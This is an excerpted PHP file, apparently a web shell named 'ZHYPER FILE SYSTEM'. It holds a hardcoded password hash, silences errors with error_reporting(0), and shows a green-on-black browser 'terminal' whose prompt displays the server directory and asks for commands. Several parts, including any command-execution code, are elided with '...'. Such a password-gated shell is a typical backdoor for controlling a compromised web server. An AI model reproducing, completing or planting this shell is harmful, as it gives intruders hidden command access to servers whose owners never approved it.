<?php
session_start();
$password = "2630b3bfbc3fe2d4ad25d707284a5b48";
error_reporting(0);
...
<head>
<meta charset="UTF-8">
<title>ZHYPER FILE SYSTEM</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
...
<div class="terminal" id="term">
    <div class="term-head">
        <span style="color: #00ff00; letter-spacing: 2px;">◢ ZHYPER TERMINAL</span>
        <button class="term-close" onclick="toggleTerm()">X</button>
    </div>
    <div class="term-out" id="termOut">
> ZHYPER TERMINAL INITIALIZED<br>
> TYPE COMMANDS BELOW<br>
<br>
    </div>
    <div class="term-in">
        <span class="term-prompt" id="termPrompt">zhyper@<?php echo $dir; ?> $</span>
...
function updatePrompt() {
    ...
    document.getElementById('termPrompt').textContent = 'zhyper@' + short + ' $';
}
